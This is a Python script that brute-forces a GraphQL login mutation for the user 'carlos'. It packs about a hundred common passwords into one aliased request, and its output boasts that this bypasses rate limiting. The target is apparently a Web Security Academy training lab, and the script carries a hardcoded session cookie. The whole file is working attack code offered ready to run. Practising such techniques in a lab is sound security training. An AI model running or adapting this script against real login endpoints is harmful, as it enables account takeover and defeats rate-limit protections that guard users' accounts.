#!/usr/bin/env python3

import requests
import json
import sys

url = "https://0a6e008b03907d1480df3a9300310087.web-security-academy.net/graphql/v1"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://0a6e008b03907d1480df3a9300310087.web-security-academy.net/login",
    "Content-Type": "application/json",
    "Origin": "https://0a6e008b03907d1480df3a9300310087.web-security-academy.net",
    "Connection": "keep-alive",
    "Cookie": "session=wjFvFUyfDlwBTMSpF40IQjLSfTXemYow",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0"
}

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]


def build_aliased_query(password_batch):
    """Build a GraphQL mutation with multiple aliases for batch testing"""
    mutations = []
    for i, password in enumerate(password_batch):
        escaped_password = password.replace('"', '\\"')
        alias = f"bruteforce{i}"
        mutation = f'{alias}:login(input:{{password: "{escaped_password}", username: "carlos"}}) {{ token success }}'
        mutations.append(mutation)

    query = "mutation { " + " ".join(mutations) + " }"
    return {"query": query}


def send_batch_request(password_batch):
    """Send a batch login request with multiple passwords using aliases"""
    query_data = build_aliased_query(password_batch)

    try:
        response = requests.post(url, headers=headers,
                                 json=query_data, timeout=30)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None


def parse_batch_response(response, password_batch):
    """Parse the GraphQL batch response and find successful logins"""
    if not response:
        return "error", None, None

    try:
        data = response.json()

        if "errors" in data:
            return "error", f"GraphQL errors: {data['errors']}", None

        if "data" in data and data["data"]:
            for i, password in enumerate(password_batch):
                alias = f"bruteforce{i}"
                if alias in data["data"]:
                    login_data = data["data"][alias]
                    if login_data and login_data.get("success") == True:
                        return "success", password, login_data.get("token")

        return "failed", None, None

    except json.JSONDecodeError:
        return "error", "Invalid JSON response", None


def main():
    print(f"Starting GraphQL batch brute force attack with aliases...")
    print(f"Target: {url}")
    print(f"Username: carlos")
    print(f"Password list size: {len(passwords)}")
    print("-" * 50)

    batch_size = len(passwords)
    total_attempts = len(passwords)

    print(
        f"\nTesting all {len(passwords)} passwords in a single batch request...")
    print("This bypasses rate limiting by using GraphQL aliases!")

    batch = passwords
    response = send_batch_request(batch)
    result_type, password_or_message, token = parse_batch_response(
        response, batch)

    if result_type == "success":
        print(f"\nSUCCESS! Password found: '{password_or_message}'")
        print(f"Token: {token}")
        sys.exit(0)
    elif result_type == "failed":
        print(f"All passwords failed")
    else:
        print(f"Error: {password_or_message}")

    print(f"\nAttack completed. No valid password found in the list.")
    print(f"Total attempts: {total_attempts}")


if __name__ == "__main__":
    main()
